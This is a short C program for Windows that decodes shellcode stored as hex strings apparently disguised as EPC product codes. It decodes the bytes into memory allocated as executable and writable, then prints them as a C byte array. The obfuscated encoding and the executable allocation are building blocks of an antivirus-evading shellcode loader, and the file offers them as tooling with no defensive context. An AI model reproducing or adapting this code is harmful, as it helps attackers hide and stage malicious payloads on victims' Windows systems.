#include <windows.h>
#include <stdio.h>
#include "shellcode.h"

void decode_epc(const char *epcs[], int count, unsigned char *decoded_shellcode)
{
    for (int i = 0; i < count; i++)
    {
        const char *segment = epcs[i];
        int j = 0;

        while (*segment && j < 12)
        {
            if (*segment == '-')
            {
                segment++;
                continue;
            }

            sscanf_s(segment, "%2hhx", &decoded_shellcode[i * 12 + j]);
            segment += 2;
            j++;

            if (*segment == '-')
                segment++;
        }
    }
}

int main()
{
    LPVOID shellcode = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (shellcode == NULL)
        return 1;

    decode_epc(encoded, shellcode_len / 12, (unsigned char *)shellcode);

    printf("\nunsigned char shellcode[] = {");

    for (unsigned int i = 0; i < shellcode_len; i++)
    {
        if (i % 20 == 0)
            printf("\n\t");
        printf("0x%02x,", ((unsigned char *)shellcode)[i]);
    }

    printf("\n};\n");

    return 0;
}
